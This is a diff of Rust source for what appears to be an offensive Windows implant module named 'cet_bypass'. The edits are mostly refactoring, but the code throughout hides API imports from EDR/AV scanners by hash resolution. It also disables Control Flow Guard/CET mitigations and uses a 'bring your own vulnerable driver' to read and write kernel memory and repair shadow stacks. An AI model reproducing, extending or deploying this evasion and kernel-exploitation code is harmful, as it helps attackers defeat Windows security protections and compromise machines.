@@ -43,7 +43,7 @@
 #![cfg(all(windows, feature = "cet-bypass"))]
 
 use std::sync::atomic::{AtomicBool, AtomicU8, Ordering};
-use once_cell::sync::OnceLock;
+use std::sync::OnceLock;
 
 // Local Windows ABI type definitions — avoids winapi static imports that produce
 // IAT entries visible to EDR/AV scanners.  All layouts match the Windows x64 ABI.
@@ -59,7 +59,7 @@ type SIZE_T = usize;
 type ProcessMitigationPolicy = u32;
 
 /// Policy class for Control Flow Guard (value 7).
-const ProcessControlFlowGuardPolicy: ProcessMitigationPolicy = 7;
+const PROCESS_CONTROL_FLOW_GUARD_POLICY: ProcessMitigationPolicy = 7;
 
 /// CFG mitigation policy structure (matches Windows x64 ABI).
 #[repr(C)]
@@ -187,16 +187,16 @@ const STATUS_ACCESS_DENIED: i32 = 0xC0000022_u32 as i32;
 
 /// Dynamically resolve and call `GetLastError` via pe_resolve (no IAT entry).
 fn dynamic_get_last_error() -> u32 {
-    let kernel32 = match pe_resolve::get_module_handle_by_hash(
+    let kernel32 = match unsafe { pe_resolve::get_module_handle_by_hash(
         pe_resolve::hash_str(b"kernel32.dll\0")
-    ) {
+    ) } {
         Some(b) => b,
         None => return 0,
     };
-    let fn_addr = match pe_resolve::get_proc_address_by_hash(
+    let fn_addr = match unsafe { pe_resolve::get_proc_address_by_hash(
         kernel32,
         pe_resolve::hash_str(b"GetLastError\0")
-    ) {
+    ) } {
         Some(a) => a,
         None => return 0,
     };
@@ -441,12 +441,12 @@ fn detect_cet_state() {
         HANDLE, ProcessMitigationPolicy, PVOID, SIZE_T,
     ) -> BOOL;
     let get_policy_fn: Option<FnGetProcessMitigationPolicy> = {
-        let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL);
+        let kernel32 = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) };
         match kernel32 {
             Some(base) => {
                 let hash = pe_resolve::hash_str(b"GetProcessMitigationPolicy\0");
-                pe_resolve::get_proc_address_by_hash(base, hash)
-                    .map(|addr| unsafe { std::mem::transmute::<_, FnGetProcessMitigationPolicy>(addr as *mut _) })
+                unsafe { pe_resolve::get_proc_address_by_hash(base, hash) }
+                    .map(|addr| unsafe { std::mem::transmute::<usize, FnGetProcessMitigationPolicy>(addr) })
             }
             None => None,
         }
@@ -464,7 +464,7 @@ fn detect_cet_state() {
     let result = unsafe {
         get_policy_fn(
             (-1isize) as *mut _,
-            ProcessControlFlowGuardPolicy,
+            PROCESS_CONTROL_FLOW_GUARD_POLICY,
             &mut cfg_policy as *mut _ as PVOID,
             std::mem::size_of::<ProcessMitigationControlFlowGuardPolicy>() as SIZE_T,
         )
@@ -523,18 +523,18 @@ fn can_disable_cet_policy() -> bool {
         ProcessMitigationPolicy, PVOID, SIZE_T,
     ) -> BOOL;
 
-    let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL);
+    let kernel32 = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) };
     let get_fn: Option<FnGetPolicy> = kernel32
         .and_then(|base| {
             let hash = pe_resolve::hash_str(b"GetProcessMitigationPolicy\0");
-            pe_resolve::get_proc_address_by_hash(base, hash)
-                .map(|addr| unsafe { std::mem::transmute::<_, FnGetPolicy>(addr as *mut _) })
+            unsafe { pe_resolve::get_proc_address_by_hash(base, hash) }
+                .map(|addr| unsafe { std::mem::transmute::<usize, FnGetPolicy>(addr) })
         });
     let set_fn: Option<FnSetPolicy> = kernel32
         .and_then(|base| {
             let hash = pe_resolve::hash_str(b"SetProcessMitigationPolicy\0");
-            pe_resolve::get_proc_address_by_hash(base, hash)
-                .map(|addr| unsafe { std::mem::transmute::<_, FnSetPolicy>(addr as *mut _) })
+            unsafe { pe_resolve::get_proc_address_by_hash(base, hash) }
+                .map(|addr| unsafe { std::mem::transmute::<usize, FnSetPolicy>(addr) })
         });
 
     let get_fn = match get_fn {
@@ -549,7 +549,7 @@ fn can_disable_cet_policy() -> bool {
     let result = unsafe {
         get_fn(
             (-1isize) as *mut _,
-            ProcessControlFlowGuardPolicy,
+            PROCESS_CONTROL_FLOW_GUARD_POLICY,
             &mut current as *mut _ as PVOID,
             std::mem::size_of::<ProcessMitigationControlFlowGuardPolicy>() as SIZE_T,
         )
@@ -563,7 +563,7 @@ fn can_disable_cet_policy() -> bool {
     // If this fails with ACCESS_DENIED, we cannot change CET.
     let set_result = unsafe {
         set_fn(
-            ProcessControlFlowGuardPolicy,
+            PROCESS_CONTROL_FLOW_GUARD_POLICY,
             &current as *const _ as PVOID,
             std::mem::size_of::<ProcessMitigationControlFlowGuardPolicy>() as SIZE_T,
         )
@@ -613,11 +613,11 @@ fn disable_cet_for_process(handle: HANDLE) -> bool {
             ProcessMitigationPolicy, PVOID, SIZE_T,
         ) -> BOOL;
 
-        let set_fn: Option<FnSetPolicy> = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
+        let set_fn: Option<FnSetPolicy> = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) }
             .and_then(|base| {
                 let hash = pe_resolve::hash_str(b"SetProcessMitigationPolicy\0");
-                pe_resolve::get_proc_address_by_hash(base, hash)
-                    .map(|addr| unsafe { std::mem::transmute::<_, FnSetPolicy>(addr as *mut _) })
+                unsafe { pe_resolve::get_proc_address_by_hash(base, hash) }
+                    .map(|addr| unsafe { std::mem::transmute::<usize, FnSetPolicy>(addr) })
             });
 
         let set_fn = match set_fn {
@@ -632,7 +632,7 @@ fn disable_cet_for_process(handle: HANDLE) -> bool {
 
         let result = unsafe {
             set_fn(
-                ProcessControlFlowGuardPolicy,
+                PROCESS_CONTROL_FLOW_GUARD_POLICY,
                 &zero_policy as *const _ as PVOID,
                 std::mem::size_of::<ProcessMitigationControlFlowGuardPolicy>() as SIZE_T,
             )
@@ -688,7 +688,7 @@ fn disable_cet_nt(handle: HANDLE) -> bool {
     }
 
     let input = MitigationPolicyInput {
-        policy_class: ProcessControlFlowGuardPolicy,
+        policy_class: PROCESS_CONTROL_FLOW_GUARD_POLICY,
         reserved: 0,
         policy_data: ProcessMitigationControlFlowGuardPolicy { Flags: 0 },
     };
@@ -1044,7 +1044,7 @@ pub fn has_call_chain(func_name: &str) -> bool {
 // EXCEPTION_CONTINUE_SEARCH (crash) rather than corrupting kernel memory.
 
 /// NTSTATUS code for STATUS_CONTROL_STACK_VIOLATION (#CP exception).
-const STATUS_CONTROL_STACK_VIOLATION: i32 = 0xC00001CF_u32 as i32;
+const STATUS_CONTROL_STACK_VIOLATION: u32 = 0xC00001CF_u32;
 
 /// VEH return: continue execution (exception handled).
 const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
@@ -1099,13 +1099,18 @@ fn shadow_stack_offset_for_build(build: u32) -> Option<usize> {
 fn get_kernel_base() -> Option<u64> {
     let mut buf_size: u32 = 0;
     unsafe {
-        let _ = crate::syscall!(
+        if let Err(e) = crate::syscall!(
             "NtQuerySystemInformation",
             11u32, // SystemModuleInformation
             0 as *mut u8,
             0,
             &mut buf_size as *mut u32
-        );
+        ) {
+            log::warn!(
+                "cet_bypass: NtQuerySystemInformation (size query) resolution failed: {e}"
+            );
+            return None;
+        }
     }
     if buf_size == 0 {
         log::warn!("cet_bypass: NtQuerySystemInformation returned zero buffer size");
@@ -1114,7 +1119,7 @@ fn get_kernel_base() -> Option<u64> {
 
     let mut buffer: Vec<u8> = vec![0u8; buf_size as usize + 4096];
     let mut return_length: u32 = 0;
-    let status = unsafe {
+    let status = match unsafe {
         crate::syscall!(
             "NtQuerySystemInformation",
             11u32,
@@ -1122,6 +1127,14 @@ fn get_kernel_base() -> Option<u64> {
             buffer.len() as u32,
             &mut return_length as *mut u32
         )
+    } {
+        Ok(status) => status,
+        Err(e) => {
+            log::warn!(
+                "cet_bypass: NtQuerySystemInformation resolution failed: {e}"
+            );
+            return None;
+        }
     };
     if status < 0 {
         log::warn!("cet_bypass: NtQuerySystemInformation failed: 0x{:08X}", status as u32);
@@ -1155,7 +1168,7 @@ fn get_kernel_base() -> Option<u64> {
 /// addresses.  Returns the value read, or None on any error.
 #[cfg(feature = "kernel-callback")]
 fn kernel_read_u64(
-    driver: &kernel_callback::driver_db::VulnerableDriver,
+    driver: &crate::kernel_callback::driver_db::VulnerableDriver,
     device_handle: usize,
     cr3: u64,
     kernel_addr: u64,
@@ -1165,11 +1178,11 @@ fn kernel_read_u64(
         // Translate VA→PA via page-table walk.
         let phys = kernel_translate_va_to_pa(driver, device_handle, cr3, kernel_addr)?;
         unsafe {
-            kernel_callback::deploy::read_physical_memory(driver, device_handle, phys, &mut buf).ok()?
+            crate::kernel_callback::deploy::read_physical_memory(driver, device_handle, phys, &mut buf).ok()?
         }
     } else {
         unsafe {
-            kernel_callback::deploy::read_physical_memory(driver, device_handle, kernel_addr, &mut buf).ok()?
+            crate::kernel_callback::deploy::read_physical_memory(driver, device_handle, kernel_addr, &mut buf).ok()?
         }
     }
     Some(u64::from_le_bytes(buf))
@@ -1180,7 +1193,7 @@ fn kernel_read_u64(
 /// Handles VA→PA translation internally.  Returns true on success.
 #[cfg(feature = "kernel-callback")]
 fn kernel_write_u64(
-    driver: &kernel_callback::driver_db::VulnerableDriver,
+    driver: &crate::kernel_callback::driver_db::VulnerableDriver,
     device_handle: usize,
     cr3: u64,
     kernel_addr: u64,
@@ -1193,11 +1206,11 @@ fn kernel_write_u64(
             None => return false,
         };
         unsafe {
-            kernel_callback::deploy::write_physical_memory(driver, device_handle, phys, &data).is_ok()
+            crate::kernel_callback::deploy::write_physical_memory(driver, device_handle, phys, &data).is_ok()
         }
     } else {
         unsafe {
-            kernel_callback::deploy::write_physical_memory(driver, device_handle, kernel_addr, &data).is_ok()
+            crate::kernel_callback::deploy::write_physical_memory(driver, device_handle, kernel_addr, &data).is_ok()
         }
     }
 }
@@ -1210,7 +1223,7 @@ fn kernel_write_u64(
 /// from cet_bypass (the original is module-private).
 #[cfg(feature = "kernel-callback")]
 fn kernel_translate_va_to_pa(
-    driver: &kernel_callback::driver_db::VulnerableDriver,
+    driver: &crate::kernel_callback::driver_db::VulnerableDriver,
     device_handle: usize,
     cr3: u64,
     virtual_address: u64,
@@ -1228,7 +1241,7 @@ fn kernel_translate_va_to_pa(
     let read_entry = |phys_addr: u64, idx: u64| -> Option<u64> {
         let mut buf = [0u8; 8];
         unsafe {
-            kernel_callback::deploy::read_physical_memory(driver, device_handle, phys_addr + idx * 8, &mut buf).ok()?
+            crate::kernel_callback::deploy::read_physical_memory(driver, device_handle, phys_addr + idx * 8, &mut buf).ok()?
         }
         Some(u64::from_le_bytes(buf))
     };
@@ -1280,12 +1293,12 @@ fn kernel_translate_va_to_pa(
 /// Resolve CR3 by reading PsInitialSystemProcess → EPROCESS.DirectoryTableBase.
 #[cfg(feature = "kernel-callback")]
 fn resolve_cr3(
-    driver: &kernel_callback::driver_db::VulnerableDriver,
+    driver: &crate::kernel_callback::driver_db::VulnerableDriver,
     device_handle: usize,
     kernel_base: u64,
 ) -> Option<u64> {
     // Resolve PsInitialSystemProcess symbol.
-    let eprocess_ptr_addr = kernel_callback::discover::resolve_kernel_symbol(
+    let eprocess_ptr_addr = crate::kernel_callback::discover::resolve_kernel_symbol(
         driver,
         device_handle,
         kernel_base,
@@ -1298,7 +1311,7 @@ fn resolve_cr3(
     // (most drivers handle kernel VAs via MmMapIoSpace internally).
     let mut ptr_buf = [0u8; 8];
     unsafe {
-        kernel_callback::deploy::read_physical_memory(driver, device_handle, eprocess_ptr_addr, &mut ptr_buf)
+        crate::kernel_callback::deploy::read_physical_memory(driver, device_handle, eprocess_ptr_addr, &mut ptr_buf)
             .ok()?;
     }
     let eprocess_addr = u64::from_le_bytes(ptr_buf);
@@ -1311,7 +1324,7 @@ fn resolve_cr3(
     const DIRECTORY_TABLE_BASE_OFFSET: u64 = 0x28;
     let mut cr3_buf = [0u8; 8];
     unsafe {
-        kernel_callback::deploy::read_physical_memory(
+        crate::kernel_callback::deploy::read_physical_memory(
             driver,
             device_handle,
             eprocess_addr + DIRECTORY_TABLE_BASE_OFFSET,
@@ -1336,7 +1349,7 @@ fn resolve_cr3(
 /// We use the current processor number to index into the array.
 #[cfg(feature = "kernel-callback")]
 fn resolve_current_kthread(
-    driver: &kernel_callback::driver_db::VulnerableDriver,
+    driver: &crate::kernel_callback::driver_db::VulnerableDriver,
     device_handle: usize,
     cr3: u64,
     kernel_base: u64,
@@ -1353,7 +1366,7 @@ fn resolve_current_kthread(
     };
 
     // Resolve KiProcessorBlock — array of KPCR* pointers.
-    let kpb_addr = kernel_callback::discover::resolve_kernel_symbol(
+    let kpb_addr = crate::kernel_callback::discover::resolve_kernel_symbol(
         driver,
         device_handle,
         kernel_base,
@@ -1425,7 +1438,7 @@ unsafe extern "system" fn veh_shadow_stack_handler(
     );
 
     // Step 1: Get the deployed driver.
-    let deployed = match kernel_callback::deploy::get_deployed_driver() {
+    let deployed = match crate::kernel_callback::deploy::get_deployed_driver() {
         Some(d) => d,
         None => {
             log::error!("cet_bypass: no BYOVD driver deployed, cannot fix shadow stack");
@@ -1569,7 +1582,7 @@ unsafe extern "system" fn veh_shadow_stack_handler(
 #[cfg(feature = "kernel-callback")]
 fn install_veh_shadow_fix() {
     // Dynamically resolve AddVectoredExceptionHandler to avoid IAT entry.
-    let kernel32 = match pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0")) {
+    let kernel32 = match unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0")) } {
         Some(b) => b,
         None => {
             log::error!("cet_bypass: failed to resolve kernel32 for AddVectoredExceptionHandler");
@@ -1577,10 +1590,10 @@ fn install_veh_shadow_fix() {
         }
     };
 
-    let fn_addr = match pe_resolve::get_proc_address_by_hash(
+    let fn_addr = match unsafe { pe_resolve::get_proc_address_by_hash(
         kernel32,
         pe_resolve::hash_str(b"AddVectoredExceptionHandler\0"),
-    ) {
+    ) } {
         Some(a) => a,
         None => {
             log::error!("cet_bypass: failed to resolve AddVectoredExceptionHandler");
@@ -1657,11 +1670,11 @@ fn get_windows_build() -> u32 {
         }
 
         let ntdll_hash = pe_resolve::hash_wstr(&"ntdll.dll\0".encode_utf16().collect::<Vec<u16>>());
-        if let Some(ntdll_base) = pe_resolve::get_module_handle_by_hash(ntdll_hash) {
+        if let Some(ntdll_base) = unsafe { pe_resolve::get_module_handle_by_hash(ntdll_hash) } {
             let fn_hash = pe_resolve::hash_str(b"RtlGetVersion\0");
-            if let Some(fn_addr) = pe_resolve::get_proc_address_by_hash(ntdll_base, fn_hash) {
+            if let Some(fn_addr) = unsafe { pe_resolve::get_proc_address_by_hash(ntdll_base, fn_hash) } {
                 type FnRtlGetVersion = unsafe extern "system" fn(*mut OsVersionInfoExW) -> i32;
-                let rtl_get_version: FnRtlGetVersion = unsafe { std::mem::transmute(fn_addr as *mut _) };
+                let rtl_get_version: FnRtlGetVersion = unsafe { std::mem::transmute::<usize, FnRtlGetVersion>(fn_addr) };
                 let mut version_info = OsVersionInfoExW {
                     dw_os_version_info_size: std::mem::size_of::<OsVersionInfoExW>() as u32,
                     dw_major_version: 0,
